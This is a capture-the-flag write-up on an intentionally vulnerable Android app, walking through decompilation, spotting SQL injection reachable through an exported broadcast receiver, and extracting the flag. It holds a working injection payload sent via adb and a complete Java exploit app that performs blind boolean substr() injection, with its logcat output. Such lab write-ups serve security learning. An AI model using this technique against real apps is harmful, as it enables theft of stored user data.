**Note**: For this challenge, we need install some things into our Android 5.1 device with Genymotion.
For example, an **ARM Translator**.
https://github.com/m9rco/Genymotion_ARM_Translation

Download **APK**: https://lautarovculic.com/my_files/BobbyApplication_CTF.apk

![[littleBobby1.png]]

Install the **apk** with **adb**
```bash
adb install -r BobbyApplication_CTF.apk
```

We can see a **login form**. Let's decompile the content with **apktool**.
```bash
apktool d BobbyApplication_CTF.apk
```
And let's check the **source code** with **jadx** (GUI version)
We can conclude that the **package name is** `bobbytables.ctf.myapplication`

After create an **user** "asd" for test, I notice that an **database** is created `LocalDatabase.db`
That the content is the following
```bash
sqlite3 LocalDatabase.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
android_metadata  users
sqlite> select * from users;
1|asd|f56f8a557c93508f7e083b70f65a6f76|ctf{An injection is all you need to get this flag - f56f8a557c93508f7e083b70f65a6f76}|6813
Program interrupted.
```

```bash
1|asd|f56f8a557c93508f7e083b70f65a6f76|ctf{An injection is all you need to get this flag - f56f8a557c93508f7e083b70f65a6f76}|6813
```

And because here's the **LocalDatabaseHelper** class
```java
public class LocalDatabaseHelper extends SQLiteOpenHelper {  
    private static final String COMMA_SEP = ",";  
    public static final String DATABASE_NAME = "LocalDatabase.db";  
    public static final int DATABASE_VERSION = 1;  
    private static final String SQL_CREATE_ENTRIES = "CREATE TABLE users (_id INTEGER PRIMARY KEY,username TEXT,password TEXT,flag TEXT,salt TEXT)";  
    private static final String SQL_DELETE_ENTRIES = "DROP TABLE IF EXISTS users";  
    private static final String TEXT_TYPE = " TEXT";  
  
    public LocalDatabaseHelper(Context context) {  
        super(context, DATABASE_NAME, (SQLiteDatabase.CursorFactory) null, 1);  
    }  
  
    @Override // android.database.sqlite.SQLiteOpenHelper  
    public void onCreate(SQLiteDatabase db) {  
        db.execSQL(SQL_CREATE_ENTRIES);  
    }  
  
    @Override // android.database.sqlite.SQLiteOpenHelper  
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {  
        db.execSQL(SQL_DELETE_ENTRIES);  
        onCreate(db);  
    }  
  
    @Override // android.database.sqlite.SQLiteOpenHelper  
    public void onDowngrade(SQLiteDatabase db, int oldVersion, int newVersion) {  
        onUpgrade(db, oldVersion, newVersion);  
    }  
  
    public long insert(String username, String password) {  
        Random rand = new Random();  
        int salt = rand.nextInt(31337);  
        String password_hash = Utils.calcHash(password + new Integer(salt).toString());  
        SQLiteDatabase db = getWritableDatabase();  
        ContentValues values = new ContentValues();  
        values.put(LocalDatabase.UserEntry.COLUMN_NAME_USERNAME, username);  
        values.put(LocalDatabase.UserEntry.COLUMN_NAME_PASSWORD, password_hash);  
        values.put(LocalDatabase.UserEntry.COLUMN_NAME_FLAG, "ctf{An injection is all you need to get this flag - " + password_hash + "}");  
        values.put(LocalDatabase.UserEntry.COLUMN_NAME_SALT, new Integer(salt).toString());  
        long rowId = db.insert(LocalDatabase.UserEntry.TABLE_NAME, null, values);  
        db.close();  
        return rowId;  
    }  
  
    public String[] fetch(String username) {  
        SQLiteDatabase db = getReadableDatabase();  
        Cursor c = db.rawQuery("select username, password, salt from users where username = \"" + username + "\"", null);  
        c.moveToFirst();  
        String[] output = {c.getString(0), c.getString(1), c.getString(2)};  
        c.close();  
        db.close();  
        return output;  
    }  
  
    public String checkLogin(String username, String password) {  
        SQLiteDatabase db = getReadableDatabase();  
        Cursor c = db.rawQuery("select password,salt from users where username = \"" + username + "\"", null);  
        Log.d("Username", username);  
        if (c != null && c.getCount() > 0) {  
            c.moveToFirst();  
            String testPassword = c.getString(0);  
            String testSalt = c.getString(1);  
            c.close();  
            db.close();  
            if (Utils.calcHash(password + testSalt).equals(testPassword)) {  
                Log.d("Result", "Logged in");  
                return "Logged in";  
            }  
            Log.d("Result", "Incorrect password");  
            return "Incorrect password";  
        }  
        if (c != null) {  
            c.close();  
        }  
        db.close();  
        Log.d("Result", "User does not exist");  
        return "User does not exist";  
    }  
  
    public boolean checkUser(String username) {  
        SQLiteDatabase db = getReadableDatabase();  
        Cursor c = db.rawQuery("select username from users where username = \"" + username + "\"", null);  
        Boolean b = new Boolean(c != null && c.getCount() > 0);  
        if (c != null) {  
            c.close();  
        }  
        db.close();  
        Log.d("Does User exist", b.toString());  
        return b.booleanValue();  
    }  
}
```

Where in the method of the same class, we have some **query raw**.
And there are so **legible**.

Also, we can see that the **Log.d** are enabled and we can **inspect** the logs while the **app** is running and executing the code.
```bash
adb logcat -c && adb logcat
--------- beginning of main
D/Does User exist( 1774): true
E/AudioTrack(  544): did not receive expected priority boost on time
I/LatinIME(  737): Starting input. Cursor position = 3,3
--------- beginning of system
V/WindowManager(  544): Adding window Window{18a92741 u0 PopupWindow:3cccac2c} at 9 of 15 (after Window{31625236 u0 bobbytables.ctf.myapplication/bobbytables.ctf.myapplication.LoginActivity})
W/genymotion_audio(  110): Not supplying enough data to HAL, expected position 4893327 , only wrote 4742640
E/SpannableStringBuilder( 1774): SPAN_EXCLUSIVE_EXCLUSIVE spans cannot have a zero length
E/SpannableStringBuilder( 1774): SPAN_EXCLUSIVE_EXCLUSIVE spans cannot have a zero length
I/LatinIME(  737): Starting input. Cursor position = 8,8
V/WindowManager(  544): Adding window Window{3db87abe u0 PopupWindow:2f392c8a} at 9 of 15 (after Window{31625236 u0 bobbytables.ctf.myapplication/bobbytables.ctf.myapplication.LoginActivity})
V/WindowManager(  544): Adding window Window{38fd84ca u0 PopupWindow:237654c4} at 9 of 15 (after Window{31625236 u0 bobbytables.ctf.myapplication/bobbytables.ctf.myapplication.LoginActivity})
D/Does User exist( 1774): false
V/WindowManager(  544): Adding window Window{118d1158 u0 PopupWindow:19e5f930} at 9 of 15 (after Window{31625236 u0 bobbytables.ctf.myapplication/bobbytables.ctf.myapplication.LoginActivity})
I/LatinIME(  737): Starting input. Cursor position = 5,5
^C
```

We can see output like `D/Does User exist( 1774): true` or `D/Does User exist( 1774): false`

I create another user for a better understanding of the **DB** composition
![[littleBobby2.png]]

We can see an **Intent** in the **LoginActivity** 
```java
public void onCreate(Bundle savedInstanceState) {  
        Log.d("Startup", "Bobby's Application is now running");  
        super.onCreate(savedInstanceState);  
        IntentFilter filter = new IntentFilter();  
        new LocalDatabaseHelper(getApplicationContext());  
        filter.addAction("com.bobbytables.ctf.myapplication_INTENT");  
        LoginReceiver receiver = new LoginReceiver();  
        registerReceiver(receiver, filter);  
        setContentView(R.layout.activity_login);  
        this.mUserView = (EditText) findViewById(R.id.user);  
        this.mPasswordView = (EditText) findViewById(R.id.password);  
        this.mPasswordView.setOnEditorActionListener(new TextView.OnEditorActionListener() { // from class: bobbytables.ctf.myapplication.LoginActivity.1  
            @Override // android.widget.TextView.OnEditorActionListener  
            public boolean onEditorAction(TextView textView, int id, KeyEvent keyEvent) {  
                if (id != R.id.login && id != 0) {  
                    return false;  
                }  
                LoginActivity.this.attemptLogin();  
                return true;  
            }  
        });
[...]
[...]
[...]
```
That the **information** is sent to **LoginReceiver**.
```java
filter.addAction("com.bobbytables.ctf.myapplication_INTENT");  
LoginReceiver receiver = new LoginReceiver();  
registerReceiver(receiver, filter);
```


In the **LoginReceiver** class we have a **Broadcast Receiver** which return the result.
```java
public class LoginReceiver extends BroadcastReceiver {  
    @Override // android.content.BroadcastReceiver  
    public void onReceive(Context context, Intent intent) {  
        String username = intent.getStringExtra(LocalDatabase.UserEntry.COLUMN_NAME_USERNAME);  
        String password = intent.getStringExtra(LocalDatabase.UserEntry.COLUMN_NAME_PASSWORD);  
        Log.d("Received", username + ":" + password);  
        LocalDatabaseHelper ldh = new LocalDatabaseHelper(context);  
        String msg = ldh.checkLogin(username, password);  
        Intent outputIntent = new Intent();  
        outputIntent.setAction("com.bobbytables.ctf.myapplication_OUTPUTINTENT");  
        outputIntent.putExtra("msg", msg);  
        context.sendBroadcast(outputIntent);  
    }  
}
```
We can send **two** extra string, the **username** and the **password** through **adb**
```bash
adb shell am broadcast -a com.bobbytables.ctf.myapplication_INTENT -e username asd -e password asdasda
```
And the **output** will be **always**  `User does not exist` or `Incorrect password`

So, after research, I found this
```plaintext
The substr(X,Y,Z) function returns a substring of input string X that begins with the Y-th character and which is Z characters long. If Z is omitted then substr(X,Y) returns all characters through the end of the string X beginning with the Y-th. The left-most character of X is number 1. If Y is negative then the first character of the substring is found by counting from the right rather than the left. If Z is negative then the abs(Z) characters preceding the Y-th character are returned. If X is a string then characters indices refer to actual UTF-8 characters. If X is a BLOB then the indices refer to bytes.

"substring()" is an alias for "substr()" beginning with SQLite version 3.34.
```
Source: https://www.sqlite.org

Because, here's a **vulnerable** **raw SQL query**
```java
public boolean checkUser(String username) {  
        SQLiteDatabase db = getReadableDatabase();  
        Cursor c = db.rawQuery("select username from users where username = \"" + username + "\"", null);  
        Boolean b = new Boolean(c != null && c.getCount() > 0);  
        if (c != null) {  
            c.close();  
        }  
        db.close();  
        Log.d("Does User exist", b.toString());  
        return b.booleanValue();  
    }
```

We can use this **adb** shell command for **inject** the **SQLi**
```bash
adb shell 'am broadcast -a com.bobbytables.ctf.myapplication_INTENT -e username "\" OR 1=1 --" -e password asdasdas'
```
Notice that the **output** from **logcat** is **Incorrect password**. Which means that the **user `"\" OR 1=1 --"` is valid**.

So, now we just need **make** an **malicious** app that abuse broadcast and get the content via **ADB logcat**.
Why we can do this?
Because there are an **public Broadcast receiver**.
```java
IntentFilter filter = new IntentFilter(); filter.addAction("com.bobbytables.ctf.myapplication_INTENT"); LoginReceiver receiver = new LoginReceiver(); registerReceiver(receiver, filter);
```

This intent register an **receiver** that listening broadcast for the action `com.bobbytables.ctf.myapplication_INTENT`.
So, this make that **every app installed in the device** can **send** an **broadcast** with this action.

And, the **Broadcast Receiver** from **LoginReceiver** have some vulnerabilities, for example, this not validate which **app** coming the **Intent**.
And the **Broadcast** don't have **output restrictions**. After of the **login process**, the **LoginReceiver** send a **new intent** (`com.bobbytables.ctf.myapplication_OUTPUTINTENT`) that is **another no restricted broadcast**. Which **any app installed** can **intercept the broadcast** for obtain the result of the operation.

#### Note
The intention of this **CTF** is get the of a way the **column** of the **database**.
I reinstall the **app** for create a **admin** user in the **DB**
```bash
adb pull /data/data//bobbytables.ctf.myapplication/databases/LocalDatabase.db
```

```bash
sqlite3 LocalDatabase.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> select * from users;
1|admin|608dc6110462ee35488edf83443fbbc3|ctf{An injection is all you need to get this flag - 608dc6110462ee35488edf83443fbbc3}|15115
sqlite>
```

So, the flag in my case is `608dc6110462ee35488edf83443fbbc3`.
You can **create a admin user** but the **flag** will be **different** because we have a **salt** under **31337**
```java
 public long insert(String username, String password) {  
        Random rand = new Random();  
        int salt = rand.nextInt(31337);  
        String password_hash = Utils.calcHash(password + new Integer(salt).toString());  
        SQLiteDatabase db = getWritableDatabase();  
        ContentValues values = new ContentValues();  
        values.put(LocalDatabase.UserEntry.COLUMN_NAME_USERNAME, username);  
        values.put(LocalDatabase.UserEntry.COLUMN_NAME_PASSWORD, password_hash);  
        values.put(LocalDatabase.UserEntry.COLUMN_NAME_FLAG, "ctf{An injection is all you need to get this flag - " + password_hash + "}");  
        values.put(LocalDatabase.UserEntry.COLUMN_NAME_SALT, new Integer(salt).toString());  
        long rowId = db.insert(LocalDatabase.UserEntry.TABLE_NAME, null, values);  
        db.close();  
        return rowId;  
    }
```

So, the app that we need create, need **take** the **flag**.
You can create an **app** for **lollipop** android version (5.1) and here is the code
```java
package com.example.exploitapp;  
  
import android.content.BroadcastReceiver;  
import android.content.Context;  
import android.content.Intent;  
import android.content.IntentFilter;  
import android.os.Bundle;  
import android.util.Log;  
import androidx.appcompat.app.AppCompatActivity;  
  
public class MainActivity extends AppCompatActivity {  
  
    private final String knownPrefix = "ctf{An injection is all you need to get this flag - ";  
    private int currentIndex = knownPrefix.length() + 1;  
    private char testChar = '0';  
    private String recoveredFlag = "";  
  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        setContentView(R.layout.activity_main);  
  
        Log.d("Exploit", "Starting exploit sequence...");  
  
        // Register broadcast receiver for output intent  
        IntentFilter intentFilter = new IntentFilter("com.bobbytables.ctf.myapplication_OUTPUTINTENT");  
        registerReceiver(new FlagReceiver(), intentFilter);  
  
        // Start flag extraction  
        extractNextChar();  
    }  
  
    private void extractNextChar() {  
        String injectionPayload = "\" OR substr(flag, " + currentIndex + ", 1) = \"" + testChar + "\" --";  
        Intent intent = new Intent("com.bobbytables.ctf.myapplication_INTENT");  
        intent.putExtra("username", injectionPayload);  
        intent.putExtra("password", "asdasdas");  // Password doesn't matter due to SQLi  
        sendBroadcast(intent);  
    }  
  
    private class FlagReceiver extends BroadcastReceiver {  
        @Override  
        public void onReceive(Context context, Intent intent) {  
            String response = intent.getStringExtra("msg");  
  
            if ("Incorrect password".equals(response)) {  
                recoveredFlag += testChar;  // Character found!  
                currentIndex++;  // Move to next position  
                testChar = '0';  // Reset char to start from '0'  
                Log.d("Exploit", "Here's your flag: " + recoveredFlag);  
            } else {  
                if (testChar == '9') {  
                    testChar = 'a';  // Move to 'a' after '9'  
                } else if (testChar == 'f') {  
                    // This is an assumption that the flag uses hexadecimal characters  
                    Log.w("Exploit", "Flag extraction completed: " + knownPrefix + recoveredFlag + "}");  
                    return;  // Flag recovered  
                } else {  
                    testChar++;  // Try next character  
                }  
            }  
  
            // Continue extracting characters until the full flag is found  
            if (currentIndex < knownPrefix.length() + 32 + 1) {  
                extractNextChar();  
            }  
        }  
    }  
}
```

Run **logcat** while your app is **executing** and here's the output:
```bash
[...]
[...]
[...]
D/Exploit (11501): Here's your flag: 608dc6110462ee35488edf83443fbbc
D/Received(10176): " OR substr(flag, 84, 1) = "0" --:asdasdas
D/Username(10176): " OR substr(flag, 84, 1) = "0" --
D/Result  (10176): User does not exist
D/Received(10176): " OR substr(flag, 84, 1) = "1" --:asdasdas
D/Username(10176): " OR substr(flag, 84, 1) = "1" --
D/Result  (10176): User does not exist
D/Received(10176): " OR substr(flag, 84, 1) = "2" --:asdasdas
D/Username(10176): " OR substr(flag, 84, 1) = "2" --
D/Result  (10176): User does not exist
D/Received(10176): " OR substr(flag, 84, 1) = "3" --:asdasdas
D/Username(10176): " OR substr(flag, 84, 1) = "3" --
D/Result  (10176): Incorrect password
D/Exploit (11501): Here's your flag: 608dc6110462ee35488edf83443fbbc3
```


I hope you found it useful (: